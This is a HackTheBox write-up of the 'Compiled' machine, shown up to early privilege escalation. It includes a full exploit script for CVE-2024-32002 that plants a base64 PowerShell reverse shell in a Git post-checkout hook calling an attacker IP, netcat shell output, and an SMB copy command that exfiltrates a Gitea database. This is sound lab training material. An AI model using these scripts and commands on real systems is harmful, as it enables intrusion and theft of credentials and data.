---
title: "Compiled - HTB Writeup"
header: 
  teaser: /assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-HTB-Image.png
  header: /assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-HTB-Image.png
  og_image: /assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-HTB-Image.png
excerpt: "Compiled is a medium level Windows machine on HackTheBox that features exploitation in Git in order to create a file system symlink that allows an attacker to perform remote code execution on users that clone the malicious repository through malicious hooks. With user access to the machine, insecure file permissions allow a service database to be dumped with sensitive usernames and password hashes."
tags: [htb, writeup, compiled]
---
## Compiled - High Level Summary

[Compiled](https://app.hackthebox.com/machines/Compiled) is a medium level Windows machine on HackTheBox that features exploitation of Git in order to create a file system symlink that allows an attacker to perform remote code execution on users that clone the malicious repository through malicious hooks. With user access to the machine, insecure file permissions allow a service database to be dumped with sensitive usernames and password hashes. After cracking the hash of a more privileged account and creating a user session, a vulnerable version of Visual Studio 2019 allows the attacker to escalate to root privileges on the machine.

### Recommendations

- Software Patching - Multiple vulnerable versions of various software suites were used in order to complete the exploitation of this machine. Policies and procedures need to be implemented in order to recognize and remediate vulnerable software versions.
- Insecure File Permissions - Sensitive files such as databases for software services should be restricted to service accounts that require access in order to operate the services. 

---

## Compiled - Methodologies

### Information Gathering - Nmap Port Scan

An Nmap port scan is performed in order to determine the services on the target box that are available to the local network. This scan returns a limited set of only 3 ports accessible. Only port 5985 is immediately recognizable as the WinRM service. This indicates to us that the machine is a Windows based OS, but little information is disclosed. Additionally, the fingerprinting plugin ran against port 3000 indicates that an HTTP response was received, and a basic error 400 response indicates very little other than a cookie set as `i_like_gitea`.

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 14:52 EST
Nmap scan report for 10.10.11.26
Host is up (0.030s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=207190f347fc4439; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=bQM_IMtbjzUWtt9eFB9ckr76wUE6MTczMjk5NzE1NzAyMzEwNTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 30 Nov 2024 20:05:57 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=b4e6c364acabe91d; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=mW7jgJKHI8AB1dyabWHoyiiYcCE6MTczMjk5NzE2MjQwNTA4MzYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 30 Nov 2024 20:06:02 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=11/30%Time=674B7023%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,37D9,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=207190f347fc4439;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=bQM_IMtbjzUWtt9eFB9ckr76wUE6MTczMjk5NzE1NzAyMzEwNTgwMA;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2030\x20Nov\x202024\x2020:05:57\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21w
SF:aWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGV
SF:kLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2
SF:l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwM
SF:DA")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0
SF:,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_l
SF:ike_gitea=b4e6c364acabe91d;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\n
SF:Set-Cookie:\x20_csrf=mW7jgJKHI8AB1dyabWHoyiiYcCE6MTczMjk5NzE2MjQwNTA4Mz
SF:YwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fr
SF:ame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2030\x20Nov\x202024\x2020:
SF:06:02\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 5985/tcp)
HOP RTT      ADDRESS
1   29.37 ms 10.10.14.1
2   29.53 ms 10.10.11.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 958.08 seconds
```

Lastly, the site on port 3000 can be visited in the browser to confirm our suspicion that the service running is a Gitea instance. This service is similar to GitLab and Gogs, as it is a self hosted Git server used by developers to store code and source control through Git.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130151218.png)

### Service Enumeration

Further service enumeration is performed on the Gitea instance, which allows unauthenticated users to view a list of all users already registered on the instance. Additionally, there are two projects on the Gitea instance, both by the Richard user. The can be pulled down to the attacking machine for further investigation.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130152909.png)

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130151247.png)

After looking at the README.md file for the Compiled code project repository, it is fairly likely that this exact code is being ran on port 5000, as the README indicates so in the example URL, as well as the hard coded port number in the Python code.

```markdown
## Usage
Once the application is up and running, follow these steps to compile your projects:

1. Open your web browser and navigate to `http://localhost:5000`.
2. Enter the URL of your GitHub repository (must be a valid URL starting with `http://` and ending with `.git`).
3. Click the **Submit** button.
4. Wait for the compilation process to complete and view the results.
```

```python
from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

# Configuration
REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'

@app.route('/', methods=['GET', 'POST'])
def index():
    error = None
    success = None
    if request.method == 'POST':
        repo_url = request.form['repo_url']
        if # Add a sanitization to check for valid Git repository URLs.
            with open(REPO_FILE_PATH, 'a') as f:
                f.write(repo_url + '\n')
            success = 'Your git repository is being cloned for compilation.'
        else:
            error = 'Invalid Git repository URL. It must start with "http://" and end with ".git".'
    return render_template('index.html', error=error, success=success)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

When we visit the service on port 5000 we can see that a basic project called 'Compiled' is in fact running. This appears to be a web browser based compiler for C++, C#, and .NET projects. Of course this is probably the namesake of the box itself. A Git repository URL can be supplied to the application for it to download and compile the project. Using the repository and the code above, we can take a peek behind the curtains of what the code is doing. It looks fairly simple, as it takes our POST request and simply places the 'repo_url' parameter into a file in the Richard user's directory. I am left to assume that there is another application that watching that file to pull down the repos and perform the actual compiling.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130154454.png)

#### Calculator App

Looking a bit more into the Gitea instance, the other repo is for a simple calculator app. This app doesn't seem to do much and frankly I would bet that it's only been placed on the box in order to allow us to mess with the Compiler app on port 5000. This appears to be a good test subject for the compilation program. If we can register an account we can fork this application and create our own application to compile on their Git server.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130152130.png)

```markdown
### Installation
First of all, make sure you have Git installed on your Windows machine:

bash
C:\Users\Richard> git --version
git version 2.45.0.windows.1
C:\Users\Richard>

As you can see, we get the output of the version, meaning we do have Git installed. How we can clone the repo:
bash
git clone --recursive http://gitea.compiled.htb:3000/richard/Calculator.git

After that, double click `Calculator.sln` and Visual Studio will open with the project. Hit `CTRL + SHIFT + B` to compile it.
```

After looking, it doesn't seem like we need to create an account. Since both of these are public repos we can easily clone them down without authentication. Richard is the only user with git history. We can pull down the repos for further offline inspection.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ git clone http://10.10.11.26:3000/richard/Compiled.git          
Cloning into 'Compiled'...
remote: Enumerating objects: 1140, done.
remote: Counting objects: 100% (1140/1140), done.
remote: Compressing objects: 100% (1079/1079), done.
remote: Total 1140 (delta 54), reused 1140 (delta 54), pack-reused 0 (from 0)
Receiving objects: 100% (1140/1140), 4.76 MiB | 2.83 MiB/s, done.
Resolving deltas: 100% (54/54), done.
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ git clone http://10.10.11.26:3000/richard/Calculator.git
Cloning into 'Calculator'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 25 (delta 7), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (25/25), 8.81 KiB | 265.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ ls
Calculator  Compiled  nmap.all
```

The Compiled app only has one commit, which is just the commit of the entire repo as we pulled it down. There is no notable history. The calculator app has a few commits from ruyalonsofedez@outlook.com, but those appear to be done from an upstream fork that isn't relevant to the application's setup.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/Calculator]
└─$ ls
Calculator  Calculator.sln  README.md
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/Calculator]
└─$ git status  
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/Calculator]
└─$ git log                                         
commit 2a427a1ebf691d38a36e5d7bb98321613d538856 (HEAD -> master, origin/master, origin/HEAD)
Author: richard <richard@compiled.htb>
Date:   Fri May 24 17:25:47 2024 +0200

    Update README.md

commit a62cc851fafd8b1c1c8cb1ad49bbb774c7d32590
Author: richard <richard@compiled.htb>
Date:   Thu May 23 15:40:33 2024 +0200

    Update README.md

commit bcdd6646cf2727e485836dad466ac356d088a787
Author: richard <richard@compiled.htb>
Date:   Wed May 22 20:44:38 2024 +0200

    Add README.md

commit 61f1e0efc8ace7c1bf1b9173122fb26b609a6a28
Author: Ruy Alonso Fernández <ruyalonsofedez@outlook.com>
Date:   Wed May 22 20:42:51 2024 +0200

    Agregar archivos de proyecto.

commit 6c4ddbd817ece694d300d0aa0818f1969f5561ab
Author: Ruy Alonso Fernández <ruyalonsofedez@outlook.com>
Date:   Wed May 22 20:42:50 2024 +0200

    Agregar .gitattributes y .gitignore.
```

#### Compiled Web Site

In order to see more about what happens to the Git repositories that are written to the text file in the Richard user's home directory, we can create a pseudo repository of our own with a Python HTTP server and then watch the requests.

**Analysis of request:** setup a simple Python server on the attacking machine and see what the request looks like. After putting `http://10.10.14.6:4000/testing.git` into the site and submitting it, it takes some time for the service to actually request the URL on the box. We do this twice to see the HTTP service request. It looks like the software is doing a `git clone` from our malicious server in order to retrieve the code. Not much is known about what happens to the code after it is cloned.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130154746.png)

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/Calculator]
└─$ sudo python3 -m http.server 4000 
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 4000 (http://0.0.0.0:4000/) ...
10.10.11.26 - - [30/Nov/2024 16:32:39] code 404, message File not found
10.10.11.26 - - [30/Nov/2024 16:32:39] "GET /testing.git/info/refs?service=git-upload-pack HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.

┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/Calculator]
└─$ nc -nlvp 4000                                                                                                        
listening on [any] 4000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.26] 64879
GET /testing.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.6:4000
User-Agent: git/2.45.0.windows.1
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
Pragma: no-cache
Git-Protocol: version=2
```

### Vulnerability Enumeration

#### Possible Vulnerable Git Version Being Ran

It is important to note that we can see the version of Git being ran by the Richard user on their own README documentation. Git version 2.45.0 is being ran. We can also assume that this version of Git is used to clone down the repos of the previous application. With this version number in hand we can look for vulnerabilities to take advantage of in order to gain access. Luckily a quick Google search shows the output of a [Tenable Nessus plugin](https://www.tenable.com/plugins/nessus/202262) for this version indicating that there are multiple critical vulnerabilities for this version of Git. 

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130160422.png)

#### Possible CVES:
- CVE-2024-32004
- CVE-2024-32020
- CVE-2024-32021
- CVE-2024-32465
- [CVE-2024-32002](https://amalmurali.me/posts/git-rce/)

#### [GitHub Security Release for CVE-2024-32002](https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv)

### Penetration

There are a few proof of concept repos on GitHub for this vulnerability but by far the most effective was the repo by [Amalmurali47](https://github.com/amalmurali47) which utilizes two repos. The first `git_rce` repo is the base repository for the exploit, while the `hook` repo is the submodule is is loaded in order to execute the actual vulnerability. 

<https://github.com/amalmurali47/git_rce>

<https://github.com/amalmurali47/hook>

While it appears that we could setup our own Git server on the attack box, with the Gitea instance already setup, we can simply create an account on the target Gitea instance to have an easy Git server to host our malicious repos on. Below is a screenshot of the registration page that we used to create an account on the instance.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130164542.png)

It took me a ***really*** long time to figure out exactly how this exploit works on remote repos rather than the intended local repos that the script is intended to be used. We can start by cloning down the Git repository and investigating the repo creation script that is designed to generate the submodule used for exploitation.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ git clone https://github.com/amalmurali47/git_rce.git
Cloning into 'git_rce'...
remote: Enumerating objects: 35, done.
remote: Counting objects: 100% (2/2), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 35 (delta 0), reused 0 (delta 0), pack-reused 33 (from 1)
Receiving objects: 100% (35/35), 5.53 KiB | 2.76 MiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ cd git_rce     
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ ls
a  A  create_poc.sh  README.md
                                                                                                                                                                 
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ nvim create_poc.sh 
```
#### Original Repo Creation Script:

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130170540.png)

#### Modified Repo Creation Script:

First, we have to make sure that we create a repo on the Gitea instance. This will serve as the repo that is pulled down by the Richard user as a function of the Compiled program running on port 5000. We have to create our own repo so that we have write privileges, which we will not have for other repos on the box. For demonstration purposes this repo will be named 'captain' so that it relatively matches the script we downloaded.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130210834.png)

Modify the script to create the repos locally and to pull from the Gitlea repo hook. Since captain has already been created on the Gitea side we want to clone it instead of init it. Then we can remake our reverse shell in case this doesn't work the first time. We will also need to make the hook repo in Gitea so that we can clone that down and upload our malicious code. The original script is meant to do everything locally so we have to edit it to work with our remote repos. It might be required to run the original version once in order to generate the two repos locally. Review the following script:

**NOTE:** The PowerShell reverse shell was generated from <https://www.revshells.com/> as PowerShell #3 (Base64). Be sure to create your own reverse shell with your attack machine IP, as this is the reverse shell code to be executed and will vary based on your attack machine.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ cat ./create_poc.sh   
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main
git clone http://compiled.htb:3000/thadigus/hook.git
cd hook
mkdir -p y/hooks
cat >y/hooks/post-checkout <<EOF
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
EOF
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push
cd ..
git clone http://compiled.htb:3000/thadigus/captain.git
cd captain
git submodule add --name x/y "http://compiled.htb:3000/thadigus/hook.git" A/modules/x
git commit -m "add-submodule"
printf ".git" >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m "add-symlink"
git push
```

With this script ready to execute we can now prepare for the attack portion of this step. After creating the two repos, editing the script, and generating our reverse shell we can simply run the script as show below:

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ nvim create_poc.sh 
                                                                               
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ ./create_poc.sh 
Cloning into 'hook'...
warning: You appear to have cloned an empty repository.
[main (root-commit) a4bd23a] post-checkout
 1 file changed, 2 insertions(+)
 create mode 100755 y/hooks/post-checkout
Username for 'http://compiled.htb:3000': thadigus
Password for 'http://thadigus@compiled.htb:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 912 bytes | 912.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://compiled.htb:3000/thadigus/hook.git
 * [new branch]      main -> main
Cloning into 'captain'...
warning: You appear to have cloned an empty repository.
Cloning into '/home/kali/Hacking/HTB/Compiled/git_rce/captain/A/modules/x'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
[main (root-commit) f77eb16] add-submodule
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 A/modules/x
[main be2484f] add-symlink
 1 file changed, 1 insertion(+)
 create mode 120000 a
Username for 'http://compiled.htb:3000': thadigus
Password for 'http://thadigus@compiled.htb:3000': 
Enumerating objects: 8, done.
Counting objects: 100% (8/8), done.
Delta compression using up to 4 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (8/8), 572 bytes | 572.00 KiB/s, done.
Total 8 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://compiled.htb:3000/thadigus/captain.git
 * [new branch]      main -> main
```

All relevant code was generated and the committed to the repo as we intended. Both remote repos now have the code necessary to attack a vulnerable Git client. Hopefully, when the Richard user clones the repo he will end up executing the PowerShell reverse shell that implanted. We can visit the Gitea instance to ensure that all code is present.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130214514.png)

If the code repository looks good, and we can visit the submodule repository by clicking the module, we should be ready to execute. This entire vulnerability relies on the execution of insecurely trusted symlinks within the repos, so it is important to make sure the path looks good for that too. At this point we're ready to start up a Netcat reverse shell handler with `nc -nlvp 4444` to handle the return. Then we can visit the Compiled application on port 5000 and submit our malicious repo for compilation. If all was done correctly, then we can expect a reverse shell in our handler.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241130214537.png)

**Note:** if you do not get a reverse shell immediately be sure to wait a couple minutes and resubmit the Git repo a few times. There is a chance that the clone process will get frozen up by other users and this might take a few attempts. There was a delay of about two minutes when I originally performed this attack, but users on the HTB forums stated that it was much more difficult to get the exploit to run.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled/git_rce]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.26] 64924
whoami
Richard
PS C:\Users\Richard\source\cloned_repos\3rf4c\.git\modules\x> ls


    Directory: C:\Users\Richard\source\cloned_repos\3rf4c\.git\modules\x


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         12/1/2024   4:37 AM                y                                                                    


PS C:\Users\Richard\source\cloned_repos\3rf4c\.git\modules\x> 
```

With this we have a user session on the target machine and we can access the files and services that this user is running. It is worth noting that the user flag was not in this user's Desktop like we would expect. It looks like we will have to pivot to another user before we can get our first flag.

### Privilege Escalation

There really isn't a ton that the Richard user can do, but it looks like he had read rights over the Gitea instance. The only file that seems to have anything in it would be the actual database file located at `C:\Program Files\Gitea\data\gitea.db`.

We can use a simple smbserver script that is part of the [Impacket](https://github.com/fortra/impacket) repository. This will quickly host an entire working directory as an SMB share for easy exfiltration of data over the network. This is especially handy against Windows machines. With one command we are able to host the server and then the following command can be ran to copy the data base over to the attacking machine: `copy gitea.db \\10.10.14.6\share\gitea.db`

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ sudo /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.26,64977)
[*] AUTHENTICATE_MESSAGE (COMPILED\Richard,COMPILED)
[*] User COMPILED\Richard authenticated successfully
[*] Richard::COMPILED:aaaaaaaaaaaaaaaa:375b77c13ed0ee0b21d135ef4c4fbc09:010100000000000000580302a543db019ff3fbd99f9365a5000000000100100047004600470057006f004a004f0064000300100047004600470057006f004a004f00640002001000440057006300490077004b006400490004001000440057006300490077004b00640049000700080000580302a543db010600040002000000080030003000000000000000000000000020000036cccab758d173b0819df642600f460874118fc70f0acd6d2444009a161e44070a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
^CTraceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 108, in <module>
    server.start()
  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 4911, in start
    self.__server.serve_forever()
  File "/usr/lib/python3.12/socketserver.py", line 235, in serve_forever
    ready = selector.select(poll_interval)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/selectors.py", line 415, in select
    fd_event_list = self._selector.poll(timeout)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt
[*] Disconnecting Share(1:IPC$)

[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.11.26,64977)
[*] Remaining connections []
                                                                               
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ ls
Calculator  Compiled  git_rce        nc64.exe  nmap.all
captain     gitea.db  git_rce_dirty  nc.exe
                                                                               
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ ls -la
total 2100
drwxrwxr-x  7 kali kali    4096 Nov 30 22:56 .
drwxrwxr-x 21 kali kali    4096 Nov 30 14:49 ..
drwxrwxr-x  5 kali kali    4096 Nov 30 16:46 Calculator
drwxrwxr-x  4 kali kali    4096 Nov 30 22:29 captain
drwxrwxr-x  6 kali kali    4096 Nov 30 15:41 Compiled
-rwxr-xr-x  1 root root 2023424 Nov 30 22:36 gitea.db
drwxrwxr-x  6 kali kali    4096 Nov 30 22:36 git_rce
drwxrwxr-x  6 kali kali    4096 Nov 30 21:56 git_rce_dirty
-rw-rw-r--  1 kali kali   45272 Nov 30 22:48 nc64.exe
-rw-rw-r--  1 kali kali   38616 Nov 30 22:45 nc.exe
-rw-r--r--  1 root root    5230 Nov 30 15:08 nmap.all
```

